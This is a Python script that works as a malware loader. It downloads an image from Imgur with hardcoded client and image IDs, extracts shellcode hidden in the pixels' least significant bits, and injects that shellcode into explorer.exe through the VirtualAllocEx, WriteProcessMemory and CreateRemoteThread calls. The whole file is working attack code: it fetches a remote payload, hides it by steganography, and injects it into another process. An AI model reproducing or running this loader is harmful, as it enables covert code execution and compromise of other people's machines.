import sys
import pyimgur
import requests
from ctypes import *
from PIL import Image
from io import BytesIO
from win32com.client import GetObject

IMGUR_CLIENT_ID = "2626883c2cd43e1"
IMGUR_IMG_ID = "RmEgf62"

# Windows constants
PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
VIRTUAL_MEM  = (0x1000 | 0x2000)

# Retrieve shellcode from imgur.com using image id
def get_shellcode():
    img = pyimgur.Imgur(IMGUR_CLIENT_ID)
    image = img.get_image(IMGUR_IMG_ID)
    r = requests.get(image.link)
    return image.title, BytesIO(r.content)


# Find process PID by name using WMI
def get_pid(proc_name):
    wmi = GetObject('winmgmts:')
    p = wmi.ExecQuery('select * from Win32_Process where Name="%s"' % (proc_name))
    if len(p) == 0:
        sys.exit(0)

    return p[0].Properties_('ProcessId').Value

# Keep track of current byte and bit in the shellcode
def inc_bit(shellcode, size, byte, bit):
    bit += 1
    if bit == 8:
        bit = 0
        byte += 1
        if byte != size:
            shellcode.append("")
    return byte, bit

# Get shellcode from least significant bit of each pixel
def lsb_to_shellcode(filename, image):
    shellcode_size = round(int(filename.split(".")[0])/8)
    img = Image.open(image)
    width, height = img.size
    shellcode = []
    byte = 0
    bit = 0
    over = False
    shellcode.append("")

    for i in range(width):
        for j in range(height):

            red, green, blue = img.getpixel((i, j))

            shellcode[byte] += "{0:08b}".format(red)[-1]
            byte, bit = inc_bit(shellcode, shellcode_size, byte, bit)
            if (byte == shellcode_size):
                over = True
                break

            shellcode[byte] += "{0:08b}".format(green)[-1]
            byte, bit = inc_bit(shellcode, shellcode_size, byte, bit)
            if (byte == shellcode_size):
                over = True
                break

            shellcode[byte] += "{0:08b}".format(blue)[-1]
            byte, bit = inc_bit(shellcode, shellcode_size, byte, bit)
            if (byte == shellcode_size):
                over = True
                break

        if (over == True):
                break

    return shellcode

# Convert list of string bytes to binary data
def bytes_to_raw(shellcode):
    raw_shellcode = b""
    for s in shellcode:
        raw_shellcode += bytes([int(s, 2)])
    return raw_shellcode


# Classic shellcode injection method
def load_shellcode(shellcode, pid):
    process_handle = windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
    if not process_handle:
        sys.exit(0)

    memory_allocation_variable = windll.kernel32.VirtualAllocEx(process_handle, 0, len(shellcode), 0x00001000, 0x40)
    windll.kernel32.WriteProcessMemory(process_handle, memory_allocation_variable, shellcode, len(shellcode), 0)

    if not windll.kernel32.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, 0, 0, 0):
	    sys.exit(0)

# Main function
def main():
    filename, image = get_shellcode()
    shellcode = lsb_to_shellcode(filename, image)
    raw = bytes_to_raw(shellcode)
    process_pid = get_pid("explorer.exe")
    load_shellcode(raw, process_pid)

# Entrypoint
main()